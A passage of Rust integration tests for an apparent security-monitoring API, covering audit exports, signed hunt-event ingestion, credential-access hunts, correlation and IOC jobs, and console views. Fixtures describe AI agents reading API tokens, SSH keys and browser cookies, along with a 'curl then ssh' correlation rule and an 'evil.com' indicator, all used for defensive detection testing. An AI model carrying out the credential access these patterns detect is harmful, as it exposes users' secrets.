        .try_get("event_type")
        .expect("denied download audit event_type");
    let denied_download_quantity: i32 = denied_download_audit_row
        .try_get("quantity")
        .expect("denied download audit quantity");
    let denied_download_metadata: Value = denied_download_audit_row
        .try_get("metadata")
        .expect("denied download audit metadata");
    assert_eq!(
        denied_download_event_type,
        "endpoint_evidence_archive.raw_download_denied"
    );
    assert_eq!(denied_download_quantity, 1);
    assert_eq!(denied_download_metadata["archiveId"], archive_id);
    assert_eq!(denied_download_metadata["actorType"], "service");
    assert_eq!(denied_download_metadata["actorRole"], "member");
    assert_eq!(
        denied_download_metadata["deniedReason"],
        "admin_or_owner_required"
    );
    assert!(denied_download_metadata.get("archive").is_none());

    let export_from = (Utc::now() - chrono::Duration::minutes(10))
        .to_rfc3339_opts(chrono::SecondsFormat::Secs, true);
    let export_to = (Utc::now() + chrono::Duration::minutes(10))
        .to_rfc3339_opts(chrono::SecondsFormat::Secs, true);
    let csv_request = Request::builder()
        .method(Method::GET)
        .uri(format!(
            "/api/v1/compliance/export?from={export_from}&to={export_to}&format=csv"
        ))
        .header("x-api-key", &harness.api_key)
        .body(Body::empty())
        .expect("build CSV compliance export request");
    let csv_response = harness
        .app
        .clone()
        .oneshot(csv_request)
        .await
        .expect("CSV compliance export request");
    let csv_status = csv_response.status();
    let csv_bytes = to_bytes(csv_response.into_body(), 2 * 1024 * 1024)
        .await
        .expect("read CSV compliance export body");
    assert_eq!(csv_status, StatusCode::OK);
    let csv_body = String::from_utf8(csv_bytes.to_vec()).expect("CSV export utf8");
    assert!(csv_body
        .lines()
        .next()
        .expect("CSV header")
        .contains("metadata"));
    assert!(csv_body.contains("endpoint_evidence_archive.raw_upload_denied"));
    assert!(csv_body.contains("endpoint_evidence_archive.raw_download_denied"));
    assert!(csv_body.contains("admin_api_key_required"));
    assert!(csv_body.contains("admin_or_owner_required"));
    assert!(csv_body.contains(member_upload_archive_id));
    assert!(!csv_body.contains("\"archive\""));

    let cef_request = Request::builder()
        .method(Method::GET)
        .uri(format!(
            "/api/v1/compliance/export?from={export_from}&to={export_to}&format=cef"
        ))
        .header("x-api-key", &harness.api_key)
        .body(Body::empty())
        .expect("build CEF compliance export request");
    let cef_response = harness
        .app
        .clone()
        .oneshot(cef_request)
        .await
        .expect("CEF compliance export request");
    let cef_status = cef_response.status();
    let cef_bytes = to_bytes(cef_response.into_body(), 2 * 1024 * 1024)
        .await
        .expect("read CEF compliance export body");
    assert_eq!(cef_status, StatusCode::OK);
    let cef_body = String::from_utf8(cef_bytes.to_vec()).expect("CEF export utf8");
    assert!(cef_body.contains("endpoint_evidence_archive.raw_upload_denied"));
    assert!(cef_body.contains("endpoint_evidence_archive.raw_download_denied"));
    assert!(cef_body.contains("admin_api_key_required"));
    assert!(cef_body.contains("admin_or_owner_required"));
    assert!(cef_body.contains(member_upload_archive_id));
    assert!(!cef_body.contains("\"archive\""));
}

#[tokio::test(flavor = "multi_thread", worker_threads = 2)]
async fn hunt_agent_secret_touches_returns_fleet_grouped_secret_access() {
    if !docker_available() {
        eprintln!("Skipping integration test: docker is unavailable");
        return;
    }

    let harness = setup_harness().await;
    for event in [
        serde_json::json!({
            "eventId": "hunt-secret-touch-1",
            "tenantId": harness.tenant_id.to_string(),
            "source": "receipt",
            "kind": "guard_decision",
            "occurredAt": "2026-03-06T12:00:00Z",
            "ingestedAt": "2026-03-06T12:00:01Z",
            "severity": "high",
            "verdict": "warn",
            "summary": "AI agent accessed developer API token",
            "actionType": "secret_access",
            "principal": {
                "principalId": "principal-secret-1",
                "endpointAgentId": "endpoint-secret-1",
                "runtimeAgentId": "runtime-openai",
                "principalType": "agent"
            },
            "sessionId": "session-secret-1",
            "detectionIds": ["agent_secret_touch"],
            "target": {
                "kind": "credential",
                "id": "credential:openai",
                "name": "OPENAI_API_KEY"
            },
            "evidence": {
                "rawRef": "hunt-envelope:hunt-secret-touch-1",
                "envelopeHash": "hash-secret-touch-1",
                "schemaName": "clawdstrike.sdr.fact.receipt.v1"
            },
            "attributes": {
                "credentialKind": "api_token",
                "toolName": "codex"
            }
        }),
        serde_json::json!({
            "eventId": "hunt-secret-touch-2",
            "tenantId": harness.tenant_id.to_string(),
            "source": "receipt",
            "kind": "guard_decision",
            "occurredAt": "2026-03-06T12:05:00Z",
            "ingestedAt": "2026-03-06T12:05:01Z",
            "severity": "critical",
            "verdict": "warn",
            "summary": "AI agent read SSH key",
            "actionType": "secret_access",
            "principal": {
                "principalId": "principal-secret-2",
                "endpointAgentId": "endpoint-secret-2",
                "runtimeAgentId": "runtime-claude",
                "principalType": "agent"
            },
            "sessionId": "session-secret-2",
            "detectionIds": ["developer_credential_access"],
            "target": {
                "kind": "credential",
                "id": "credential:ssh",
                "name": "id_rsa"
            },
            "evidence": {
                "rawRef": "hunt-envelope:hunt-secret-touch-2",
                "envelopeHash": "hash-secret-touch-2",
                "schemaName": "clawdstrike.sdr.fact.receipt.v1"
            },
            "attributes": {
                "credentialKind": "ssh_key",
                "toolName": "claude-code"
            }
        }),
        serde_json::json!({
            "eventId": "hunt-secret-noise-1",
            "tenantId": harness.tenant_id.to_string(),
            "source": "tetragon",
            "kind": "process_exec",
            "occurredAt": "2026-03-06T12:06:00Z",
            "ingestedAt": "2026-03-06T12:06:01Z",
            "severity": "low",
            "verdict": "allow",
            "summary": "ordinary process execution",
            "actionType": "process",
            "principal": {
                "principalId": "principal-noise-1",
                "endpointAgentId": "endpoint-noise-1",
                "runtimeAgentId": "runtime-noise",
                "principalType": "agent"
            },
            "sessionId": "session-noise-1",
            "target": {
                "kind": "process",
                "id": "1003",
                "name": "curl"
            },
            "evidence": {
                "rawRef": "hunt-envelope:hunt-secret-noise-1",
                "envelopeHash": "hash-secret-noise-1",
                "schemaName": "clawdstrike.sdr.fact.tetragon_event.v1"
            },
            "attributes": {
                "process": "/usr/bin/curl"
            }
        }),
    ] {
        let response = request_json(
            &harness.app,
            Method::POST,
            "/api/v1/hunt/events/ingest".to_string(),
            Some(&harness.api_key),
            Some(signed_hunt_ingest_request(&harness, event)),
        )
        .await;
        assert_eq!(response.0, StatusCode::OK);
    }

    let response = request_json(
        &harness.app,
        Method::POST,
        "/api/v1/hunt/agent-secret-touches".to_string(),
        Some(&harness.api_key),
        Some(serde_json::json!({
            "since": "2026-03-06T12:00:00Z",
            "until": "2026-03-06T12:10:00Z",
            "limit": 10
        })),
    )
    .await;
    assert_eq!(response.0, StatusCode::OK);
    assert_eq!(response.1["secretTouchCount"], 2);
    assert_eq!(response.1["endpointCount"], 2);
    assert_eq!(response.1["runtimeAgentCount"], 2);
    assert_eq!(response.1["events"][0]["eventId"], "hunt-secret-touch-2");
    assert_eq!(response.1["events"][1]["eventId"], "hunt-secret-touch-1");
    assert_eq!(response.1["endpoints"][0]["groupKey"], "endpoint-secret-2");
    assert_eq!(response.1["endpoints"][1]["groupKey"], "endpoint-secret-1");

    let filtered_response = request_json(
        &harness.app,
        Method::POST,
        "/api/v1/hunt/agent-secret-touches".to_string(),
        Some(&harness.api_key),
        Some(serde_json::json!({
            "agentId": "runtime-openai",
            "credentialKind": "api_token",
            "limit": 10
        })),
    )
    .await;
    assert_eq!(filtered_response.0, StatusCode::OK);
    assert_eq!(filtered_response.1["secretTouchCount"], 1);
    assert_eq!(
        filtered_response.1["endpoints"][0]["credentialKinds"][0],
        "api_token"
    );
    assert_eq!(
        filtered_response.1["events"][0]["eventId"],
        "hunt-secret-touch-1"
    );
}

#[tokio::test(flavor = "multi_thread", worker_threads = 2)]
async fn hunt_event_consumer_persists_endpoint_published_secret_touch() {
    if !docker_available() {
        eprintln!("Skipping integration test: docker is unavailable");
        return;
    }

    let harness = setup_harness().await;
    let agent_keypair = hush_core::Keypair::generate();
    let register_resp = request_json(
        &harness.app,
        Method::POST,
        "/api/v1/agents".to_string(),
        Some(&harness.api_key),
        Some(serde_json::json!({
            "agent_id": "endpoint-stream-1",
            "name": "Endpoint Stream 1",
            "public_key": agent_keypair.public_key().to_hex(),
            "role": "coder",
            "trust_level": "high"
        })),
    )
    .await;
    assert_eq!(register_resp.0, StatusCode::OK);

    let event = serde_json::json!({
        "eventId": "hunt-nats-secret-touch-1",
        "tenantId": harness.tenant_id.to_string(),
        "source": "receipt",
        "kind": "guard_decision",
        "occurredAt": "2026-03-06T12:15:00Z",
        "ingestedAt": "2026-03-06T12:15:01Z",
        "severity": "high",
        "verdict": "warn",
        "summary": "AI agent touched browser cookie",
        "actionType": "secret_access",
        "sessionId": "session-nats-secret-1",
        "detectionIds": ["agent_secret_touch"],
        "target": {
            "kind": "credential",
            "id": "credential:browser-cookie",
            "name": "browser cookie"
        },
        "evidence": {
            "rawRef": "endpoint-receipt:hunt-nats-secret-touch-1",
            "schemaName": "clawdstrike.edr.agent_secret_touch.v1"
        },
        "attributes": {
            "credentialKind": "browser_cookie",
            "toolName": "browser-automation"
        }
    });
    let payload = serde_json::to_vec(&event).expect("serialize hunt event");
    let stored = crate::services::hunt_event_consumer::process_hunt_event_payload(
        &harness.db,
        harness.signing_keypair.as_ref(),
        "tenant-acme-int.clawdstrike.hunt.events.endpoint-stream-1",
        &payload,
    )
    .await
    .expect("process hunt event payload");

    assert_eq!(stored.event_id, "hunt-nats-secret-touch-1");
    assert_eq!(
        stored.endpoint_agent_id.as_deref(),
        Some("endpoint-stream-1")
    );
    assert_eq!(stored.signature_valid, Some(true));
    assert_eq!(
        stored.schema_name.as_deref(),
        Some("clawdstrike.edr.agent_secret_touch.v1")
    );

    let query_resp = request_json(
        &harness.app,
        Method::POST,
        "/api/v1/hunt/agent-secret-touches".to_string(),
        Some(&harness.api_key),
        Some(serde_json::json!({
            "endpointAgentId": "endpoint-stream-1",
            "credentialKind": "browser_cookie"
        })),
    )
    .await;
    assert_eq!(query_resp.0, StatusCode::OK);
    assert_eq!(query_resp.1["secretTouchCount"], 1);
    assert_eq!(
        query_resp.1["events"][0]["eventId"],
        "hunt-nats-secret-touch-1"
    );
}

#[tokio::test(flavor = "multi_thread", worker_threads = 2)]
async fn hunt_ingest_rejects_unsigned_envelopes() {
    if !docker_available() {
        eprintln!("Skipping integration test: docker is unavailable");
        return;
    }

    let harness = setup_harness().await;
    let response = request_json(
        &harness.app,
        Method::POST,
        "/api/v1/hunt/events/ingest".to_string(),
        Some(&harness.api_key),
        Some(serde_json::json!({
            "event": {
                "eventId": "unsigned-hunt-evt-1",
                "tenantId": harness.tenant_id.to_string(),
                "source": "tetragon",
                "kind": "process_exec",
                "occurredAt": "2026-03-06T12:00:00Z",
                "ingestedAt": "2026-03-06T12:00:01Z",
                "severity": "low",
                "verdict": "allow",
                "summary": "unsigned event",
                "actionType": "process",
                "evidence": {
                    "rawRef": "hunt-envelope:unsigned-hunt-evt-1",
                    "schemaName": "clawdstrike.sdr.fact.tetragon_event.v1"
                },
                "attributes": {
                    "process": "/usr/bin/false"
                }
            },
            "rawEnvelope": {
                "fact": {
                    "eventId": "unsigned-hunt-evt-1"
                }
            }
        })),
    )
    .await;
    assert_eq!(response.0, StatusCode::BAD_REQUEST);
}

#[tokio::test(flavor = "multi_thread", worker_threads = 2)]
async fn hunt_ingest_rejects_conflicting_duplicate_event_ids_without_mutating_evidence() {
    if !docker_available() {
        eprintln!("Skipping integration test: docker is unavailable");
        return;
    }

    let harness = setup_harness().await;
    let original_event = serde_json::json!({
        "eventId": "hunt-immutable-evt-1",
        "tenantId": harness.tenant_id.to_string(),
        "source": "tetragon",
        "kind": "process_exec",
        "occurredAt": "2026-03-06T12:00:00Z",
        "ingestedAt": "2026-03-06T12:00:01Z",
        "severity": "medium",
        "verdict": "allow",
        "summary": "original summary",
        "actionType": "process",
        "evidence": {
            "rawRef": "hunt-envelope:immutable-evt-1",
            "envelopeHash": "immutable-hash-1",
            "schemaName": "clawdstrike.sdr.fact.tetragon_event.v1"
        },
        "attributes": {
            "process": "/usr/bin/original"
        }
    });
    let duplicate_event = serde_json::json!({
        "eventId": "hunt-immutable-evt-1",
        "tenantId": harness.tenant_id.to_string(),
        "source": "tetragon",
        "kind": "process_exec",
        "occurredAt": "2026-03-06T12:05:00Z",
        "ingestedAt": "2026-03-06T12:05:01Z",
        "severity": "critical",
        "verdict": "deny",
        "summary": "mutated summary",
        "actionType": "process",
        "evidence": {
            "rawRef": "hunt-envelope:immutable-evt-1",
            "envelopeHash": "immutable-hash-2",
            "schemaName": "clawdstrike.sdr.fact.tetragon_event.v1"
        },
        "attributes": {
            "process": "/usr/bin/mutated"
        }
    });

    let original_resp = request_json(
        &harness.app,
        Method::POST,
        "/api/v1/hunt/events/ingest".to_string(),
        Some(&harness.api_key),
        Some(signed_hunt_ingest_request(&harness, original_event)),
    )
    .await;
    assert_eq!(original_resp.0, StatusCode::OK);

    let duplicate_resp = request_json(
        &harness.app,
        Method::POST,
        "/api/v1/hunt/events/ingest".to_string(),
        Some(&harness.api_key),
        Some(signed_hunt_ingest_request(&harness, duplicate_event)),
    )
    .await;
    assert_eq!(duplicate_resp.0, StatusCode::CONFLICT);
    assert_eq!(
        duplicate_resp.1["error"],
        "hunt event conflict: eventId already ingested"
    );

    let stored_event = sqlx::query::query(
        r#"SELECT summary,
                  attributes ->> 'process' AS process,
                  envelope_hash
           FROM hunt_events
           WHERE tenant_id = $1 AND event_id = $2"#,
    )
    .bind(harness.tenant_id)
    .bind("hunt-immutable-evt-1")
    .fetch_one(&harness.db)
    .await
    .expect("load immutable hunt event");
    assert_eq!(
        stored_event
            .try_get::<String, _>("summary")
            .expect("event summary"),
        "original summary"
    );
    assert_eq!(
        stored_event
            .try_get::<String, _>("process")
            .expect("event process"),
        "/usr/bin/original"
    );
    assert_eq!(
        stored_event
            .try_get::<String, _>("envelope_hash")
            .expect("event envelope hash"),
        "immutable-hash-1"
    );

    let stored_envelope = sqlx::query::query(
        r#"SELECT raw_envelope -> 'fact' ->> 'summary' AS summary,
                  raw_envelope -> 'fact' -> 'attributes' ->> 'process' AS process
           FROM hunt_envelopes
           WHERE tenant_id = $1 AND raw_ref = $2"#,
    )
    .bind(harness.tenant_id)
    .bind("hunt-envelope:immutable-evt-1")
    .fetch_one(&harness.db)
    .await
    .expect("load immutable hunt envelope");
    assert_eq!(
        stored_envelope
            .try_get::<String, _>("summary")
            .expect("envelope summary"),
        "original summary"
    );
    assert_eq!(
        stored_envelope
            .try_get::<String, _>("process")
            .expect("envelope process"),
        "/usr/bin/original"
    );
}

#[tokio::test(flavor = "multi_thread", worker_threads = 2)]
async fn hunt_ingest_treats_retries_without_canonical_evidence_fields_as_idempotent() {
    if !docker_available() {
        eprintln!("Skipping integration test: docker is unavailable");
        return;
    }

    let harness = setup_harness().await;
    let event = serde_json::json!({
        "eventId": "hunt-idempotent-evt-1",
        "tenantId": harness.tenant_id.to_string(),
        "source": "tetragon",
        "kind": "process_exec",
        "occurredAt": "2026-03-06T12:00:00Z",
        "ingestedAt": "2026-03-06T12:00:01Z",
        "severity": "medium",
        "verdict": "allow",
        "summary": "idempotent duplicate",
        "actionType": "process",
        "evidence": {
            "rawRef": "hunt-envelope:idempotent-evt-1",
            "envelopeHash": "idempotent-hash-1",
            "schemaName": "clawdstrike.sdr.fact.tetragon_event.v1"
        },
        "attributes": {
            "process": "/usr/bin/idempotent"
        }
    });

    let first = request_json(
        &harness.app,
        Method::POST,
        "/api/v1/hunt/events/ingest".to_string(),
        Some(&harness.api_key),
        Some(signed_hunt_ingest_request_without_canonical_evidence(
            &harness,
            event.clone(),
        )),
    )
    .await;
    assert_eq!(first.0, StatusCode::OK);
    assert_eq!(first.1["eventId"], "hunt-idempotent-evt-1");
    assert!(
        first.1["issuer"].as_str().is_some(),
        "stored event should expose canonical issuer"
    );
    assert_eq!(first.1["signatureValid"], true);

    let second = request_json(
        &harness.app,
        Method::POST,
        "/api/v1/hunt/events/ingest".to_string(),
        Some(&harness.api_key),
        Some(signed_hunt_ingest_request_without_canonical_evidence(
            &harness, event,
        )),
    )
    .await;
    assert_eq!(second.0, StatusCode::OK);
    assert_eq!(second.1, first.1);

    let count: i64 = sqlx::query_scalar::query_scalar(
        "SELECT COUNT(*) FROM hunt_events WHERE tenant_id = $1 AND event_id = $2",
    )
    .bind(harness.tenant_id)
    .bind("hunt-idempotent-evt-1")
    .fetch_one(&harness.db)
    .await
    .expect("count idempotent hunt events");
    assert_eq!(count, 1);
}

#[tokio::test(flavor = "multi_thread", worker_threads = 2)]
async fn hunt_correlation_and_ioc_jobs_store_results() {
    if !docker_available() {
        eprintln!("Skipping integration test: docker is unavailable");
        return;
    }

    let harness = setup_harness().await;
    seed_hunt_events(&harness).await;

    let correlate_resp = request_json(
        &harness.app,
        Method::POST,
        "/api/v1/hunt/correlate".to_string(),
        Some(&harness.api_key),
        Some(serde_json::json!({
            "rules": [{
                "schema": "clawdstrike.hunt.correlation.v1",
                "name": "curl_then_ssh",
                "severity": "high",
                "description": "curl followed by ssh",
                "window": "10m",
                "conditions": [
                    {
                        "bind": "curl",
                        "source": "tetragon",
                        "action_type": "process",
                        "target_pattern": "curl"
                    },
                    {
                        "bind": "ssh",
                        "source": "tetragon",
                        "action_type": "process",
                        "target_pattern": "ssh",
                        "after": "curl",
                        "within": "5m"
                    }
                ],
                "output": {
                    "title": "curl followed by ssh",
                    "evidence": ["curl", "ssh"]
                }
            }],
            "query": {
                "sessionId": "session-1",
                "limit": 10
            }
        })),
    )
    .await;
    assert_eq!(correlate_resp.0, StatusCode::OK);
    assert_eq!(correlate_resp.1["jobType"], "correlate");
    assert_eq!(
        correlate_resp.1["result"]["findings"][0]["evidenceEventIds"][0],
        "hunt-evt-1"
    );
    assert_eq!(
        correlate_resp.1["result"]["findings"][0]["evidenceEventIds"][1],
        "hunt-evt-2"
    );

    let ioc_resp = request_json(
        &harness.app,
        Method::POST,
        "/api/v1/hunt/ioc/match".to_string(),
        Some(&harness.api_key),
        Some(serde_json::json!({
            "indicators": ["evil.com"],
            "query": {
                "sessionId": "session-1",
                "limit": 10
            }
        })),
    )
    .await;
    assert_eq!(ioc_resp.0, StatusCode::OK);
    assert_eq!(ioc_resp.1["jobType"], "ioc_match");
    assert_eq!(ioc_resp.1["result"]["matches"][0]["eventId"], "hunt-evt-1");

    let job_id = ioc_resp.1["id"].as_str().expect("job id");
    let get_job_resp = request_json(
        &harness.app,
        Method::GET,
        format!("/api/v1/hunt/jobs/{job_id}"),
        Some(&harness.api_key),
        None,
    )
    .await;
    assert_eq!(get_job_resp.0, StatusCode::OK);
    assert_eq!(get_job_resp.1["status"], "completed");
}

#[tokio::test(flavor = "multi_thread", worker_threads = 2)]
async fn console_read_model_routes_project_tenant_scoped_data() {
    if !docker_available() {
        eprintln!("Skipping integration test: docker is unavailable");
        return;
    }

    let harness = setup_harness().await;
    let fixture = seed_console_read_model_fixture(&harness).await;

    let overview_resp = request_json(
        &harness.app,
        Method::GET,
        "/api/v1/console/overview".to_string(),
        Some(&harness.api_key),
        None,
    )
    .await;
    assert_eq!(overview_resp.0, StatusCode::OK);
    assert_eq!(overview_resp.1["counts"]["principals"], 2);
    assert_eq!(overview_resp.1["counts"]["endpointAgents"], 1);
    assert_eq!(overview_resp.1["counts"]["runtimeAgents"], 1);
    assert_eq!(overview_resp.1["counts"]["swarms"], 1);
    assert_eq!(overview_resp.1["counts"]["projects"], 1);
    assert_eq!(overview_resp.1["counts"]["quarantinedPrincipals"], 1);
    assert_eq!(overview_resp.1["counts"]["stalePrincipals"], 1);
    assert_eq!(overview_resp.1["counts"]["activeResponseActions"], 1);
    assert_eq!(overview_resp.1["counts"]["openDetections"], 1);
    assert_eq!(
        overview_resp.1["recentResponseActions"][0]["actionId"],
        fixture.action_id.to_string()
    );
    assert_eq!(
        overview_resp.1["recentDetections"][0]["principalId"],
        fixture.principal_id.to_string()
    );

    let principals_resp = request_json(
        &harness.app,
        Method::GET,
        "/api/v1/console/principals".to_string(),
        Some(&harness.api_key),
        None,
    )
    .await;
    assert_eq!(principals_resp.0, StatusCode::OK);
    let principals = principals_resp.1.as_array().expect("principals list");
    assert_eq!(principals.len(), 2);
    let principal = principals
        .iter()
        .find(|item| item["principalId"] == fixture.principal_id.to_string())
        .expect("primary principal in list");
    assert_eq!(principal["endpointPosture"], "nominal");
    assert_eq!(principal["openResponseActionCount"], 1);
    assert_eq!(principal["swarmNames"], serde_json::json!(["Fleet East"]));
    assert_eq!(
        principal["projectNames"],
        serde_json::json!(["Payments Prod"])
    );
    assert_eq!(
        principal["capabilityGroupNames"],
        serde_json::json!(["Responders"])
    );

    let detail_resp = request_json(
        &harness.app,
        Method::GET,
        format!("/api/v1/console/principals/{}", fixture.principal_id),
        Some(&harness.api_key),
        None,
    )
    .await;
    assert_eq!(detail_resp.0, StatusCode::OK);
    assert_eq!(
        detail_resp.1["memberships"]
            .as_array()
            .expect("memberships")
            .len(),
        3
    );
    assert_eq!(detail_resp.1["effectivePolicy"]["resolutionVersion"], 4);
    let compiled_policy = detail_resp.1["compiledPolicyYaml"]
        .as_str()
        .expect("compiled policy yaml");
    assert!(compiled_policy.contains("mode: swarm"));
    assert!(compiled_policy.contains("region: east"));
    assert!(compiled_policy.contains("final: true"));
    assert_eq!(
        detail_resp.1["sourceAttachments"]
            .as_array()
            .expect("source attachments")
            .len(),
        3
    );
    assert_eq!(
        detail_resp.1["activeGrants"][0]["grantId"],
        fixture.grant_id.to_string()
    );
    assert_eq!(detail_resp.1["recentSessions"][0]["sessionId"], "session-1");

    let timeline_resp = request_json(
        &harness.app,
        Method::GET,
        format!(
            "/api/v1/console/timeline?principal_id={}",
            fixture.principal_id
        ),
        Some(&harness.api_key),
        None,
    )
    .await;
    assert_eq!(timeline_resp.0, StatusCode::OK);
    let timeline = timeline_resp.1.as_array().expect("timeline list");
    assert_eq!(timeline.len(), 2);
    assert_eq!(timeline[0]["eventId"], "console-hunt-2");
    assert_eq!(timeline[1]["eventId"], "console-hunt-1");

    let principal_timeline_resp = request_json(
        &harness.app,
        Method::GET,
        format!(
            "/api/v1/console/principals/{}/timeline",
            fixture.principal_id
        ),
        Some(&harness.api_key),
        None,
    )
    .await;
    assert_eq!(principal_timeline_resp.0, StatusCode::OK);
    assert_eq!(
        principal_timeline_resp
            .1
            .as_array()
            .expect("principal timeline")
            .len(),
        2
    );

    let actions_resp = request_json(
        &harness.app,
        Method::GET,
        "/api/v1/console/response-actions".to_string(),
        Some(&harness.api_key),
        None,
    )
    .await;
    assert_eq!(actions_resp.0, StatusCode::OK);
    let actions = actions_resp.1.as_array().expect("response actions list");
    assert_eq!(actions.len(), 1);
    assert_eq!(actions[0]["targetDisplayName"], "Planner MacBook");

    let graph_resp = request_json(
        &harness.app,
        Method::GET,
        format!("/api/v1/console/principals/{}/graph", fixture.principal_id),
        Some(&harness.api_key),
        None,
    )
    .await;
    assert_eq!(graph_resp.0, StatusCode::OK);
    assert_eq!(
        graph_resp.1["rootPrincipalId"],
        fixture.principal_id.to_string()
    );
    assert!(graph_resp.1["nodes"]
        .as_array()
        .expect("graph nodes")
        .iter()
        .any(|node| node["id"] == fixture.grant_id.to_string()));
    assert!(graph_resp.1["edges"]
        .as_array()
        .expect("graph edges")
        .iter()
        .any(|edge| edge["kind"] == "received_grant"));
}

#[tokio::test(flavor = "multi_thread", worker_threads = 2)]
async fn console_principal_detail_rejects_unresolved_policy_refs() {
    if !docker_available() {
        eprintln!("Skipping integration test: docker is unavailable");
        return;
    }

    let harness = setup_harness().await;
    let fixture = seed_console_read_model_fixture(&harness).await;

    sqlx::query::query(
        r#"INSERT INTO policy_attachments (
               tenant_id,
               target_kind,
               priority,
               policy_ref,
               checksum_sha256,
               created_by
           ) VALUES ($1, 'tenant', 5, 'catalog/default', 'checksum-unresolved', 'integration')"#,
    )
    .bind(harness.tenant_id)
    .execute(&harness.db)
    .await
    .expect("seed unresolved policy attachment");

    let detail_resp = request_json(
        &harness.app,
        Method::GET,
        format!("/api/v1/console/principals/{}", fixture.principal_id),
        Some(&harness.api_key),
        None,
    )
    .await;
    assert_eq!(detail_resp.0, StatusCode::CONFLICT);
    let error = detail_resp.1["error"]
        .as_str()
        .expect("console policy error");
    assert!(
        error.contains("unresolved policy_ref`catalog/default`")
            || error.contains("unresolved policy_ref `catalog/default`")
    );
}

#[tokio::test(flavor = "multi_thread", worker_threads = 2)]
async fn console_timeline_and_sessions_match_principal_aliases() {
    if !docker_available() {
        eprintln!("Skipping integration test: docker is unavailable");
        return;
    }

    let harness = setup_harness().await;
    let fixture = seed_console_read_model_fixture(&harness).await;

    sqlx::query::query(
        "UPDATE hunt_events SET principal_id = $3 WHERE tenant_id = $1 AND principal_id = $2",
    )
    .bind(harness.tenant_id)
    .bind(fixture.principal_id.to_string())
    .bind(&fixture.principal_stable_ref)
    .execute(&harness.db)
    .await
    .expect("rewrite hunt principal aliases");

    let detail_resp = request_json(
        &harness.app,
        Method::GET,
        format!("/api/v1/console/principals/{}", fixture.principal_id),
        Some(&harness.api_key),
        None,
    )
    .await;
    assert_eq!(detail_resp.0, StatusCode::OK);
    assert_eq!(detail_resp.1["recentSessions"][0]["sessionId"], "session-1");

    let timeline_resp = request_json(
        &harness.app,
        Method::GET,
        format!(
            "/api/v1/console/principals/{}/timeline",
            fixture.principal_id
        ),
        Some(&harness.api_key),
        None,
    )
    .await;
    assert_eq!(timeline_resp.0, StatusCode::OK);
    let timeline = timeline_resp.1.as_array().expect("principal timeline");
    assert_eq!(timeline.len(), 2);
}

#[tokio::test(flavor = "multi_thread", worker_threads = 2)]
async fn fleet_operator_workflow_links_detection_response_case_hunt_graph_and_console() {
    if !docker_available() {
        eprintln!("Skipping integration test: docker is unavailable");
        return;
    }

    let harness = setup_harness().await;
    let OperatorFlowFixture {
        agent_id,
        session_id,
        detection_raw_ref,
        response_raw_ref,
        principal_id,
        response_subject,
        legacy_response_subject,
        grant_id,
        finding_id,
        case_id,
        action_id,
    } = seed_operator_flow_fixture(&harness).await;
    let mut subscriber = harness
        .nats
        .subscribe(response_subject.clone())
        .await
        .expect("subscribe response subject");
    let mut legacy_subscriber = harness
        .nats
        .subscribe(legacy_response_subject.clone())
        .await
        .expect("subscribe legacy response subject");
    harness.nats.flush().await.expect("nats flush");

    let finding_resp = request_json(
        &harness.app,
        Method::GET,
        format!("/api/v1/detections/findings/{finding_id}"),
        Some(&harness.api_key),
        None,
    )
    .await;
    assert_eq!(finding_resp.0, StatusCode::OK);
    assert_eq!(finding_resp.1["principal_id"], principal_id.to_string());
    assert_eq!(finding_resp.1["grant_id"], grant_id.to_string());
    assert_eq!(
        finding_resp.1["response_action_ids"],
        serde_json::json!([action_id.to_string()])
    );
    assert_eq!(
        finding_resp.1["evidence_refs"],
        serde_json::json!([detection_raw_ref])
    );

    let finding_list_resp = request_json(
        &harness.app,
        Method::GET,
        format!("/api/v1/detections/findings?principal_id={principal_id}"),
        Some(&harness.api_key),
        None,
    )
    .await;
    assert_eq!(finding_list_resp.0, StatusCode::OK);
    assert_eq!(
        finding_list_resp.1.as_array().expect("findings list").len(),
        1
    );

    let approve_resp = request_json(
        &harness.app,
        Method::POST,
        format!("/api/v1/response-actions/{action_id}/approve"),
        Some(&harness.api_key),
        None,
    )
    .await;
    assert_eq!(approve_resp.0, StatusCode::OK);
    assert_eq!(approve_resp.1["action"]["status"], "published");
    assert_eq!(approve_resp.1["deliveries"][0]["status"], "published");
    assert_eq!(
        approve_resp.1["deliveries"][0]["delivery_subject"],
        response_subject
    );

    let published_message = tokio::time::timeout(Duration::from_secs(5), subscriber.next())
        .await
        .expect("response action publish timeout")
        .expect("subscriber stream ended");
    let envelope: Value = serde_json::from_slice(&published_message.payload)
        .expect("response payload should be JSON");
    assert!(
        spine::verify_envelope(&envelope).expect("response action envelope should verify"),
        "response action payload must be a signed spine envelope"
    );
    assert_eq!(envelope["fact"]["actionId"], action_id.to_string());
    assert_eq!(
        envelope["fact"]["sourceDetectionId"],
        finding_id.to_string()
    );
    assert_eq!(envelope["fact"]["caseId"], case_id);
    let legacy_message = tokio::time::timeout(Duration::from_secs(5), legacy_subscriber.next())
        .await
        .expect("legacy response action publish timeout")
        .expect("legacy subscriber stream ended");
    let legacy_envelope: Value = serde_json::from_slice(&legacy_message.payload)
        .expect("legacy response payload should be JSON");
    assert!(
        spine::verify_envelope(&legacy_envelope).expect("legacy envelope should verify"),
        "legacy response payload must be a signed spine envelope"
    );
    assert_eq!(legacy_envelope["fact"]["command"], "request_policy_reload");

    let overview_resp = request_json(
        &harness.app,
        Method::GET,
        "/api/v1/console/overview".to_string(),
        Some(&harness.api_key),
        None,
    )
    .await;
    assert_eq!(overview_resp.0, StatusCode::OK);
    assert_eq!(overview_resp.1["counts"]["principals"], 1);
    assert_eq!(overview_resp.1["counts"]["endpointAgents"], 1);
    assert_eq!(overview_resp.1["counts"]["activeResponseActions"], 1);
    assert_eq!(overview_resp.1["counts"]["openDetections"], 1);
    assert_eq!(
        overview_resp.1["recentDetections"][0]["detectionId"],
        finding_id.to_string()
    );
    assert_eq!(
        overview_resp.1["recentResponseActions"][0]["actionId"],
        action_id.to_string()
    );

    let detection_event_id = "operator-flow-hunt-1";
    let detection_event_resp = request_json(
        &harness.app,
        Method::POST,
        "/api/v1/hunt/events/ingest".to_string(),
        Some(&harness.api_key),
        Some(signed_hunt_ingest_request(
            &harness,
            serde_json::json!({
                "eventId": detection_event_id,
                "tenantId": harness.tenant_id.to_string(),
                "source": "tetragon",
                "kind": "process_exec",
                "occurredAt": "2026-03-06T13:00:00Z",
                "ingestedAt": "2026-03-06T13:00:01Z",
                "severity": "high",
                "verdict": "allow",
                "summary": "curl execution on Operator Endpoint triggered detection",
                "actionType": "process",
                "principal": {
                    "principalId": principal_id.to_string(),
                    "endpointAgentId": agent_id,
                    "principalType": "endpoint_agent"
                },
                "sessionId": session_id,
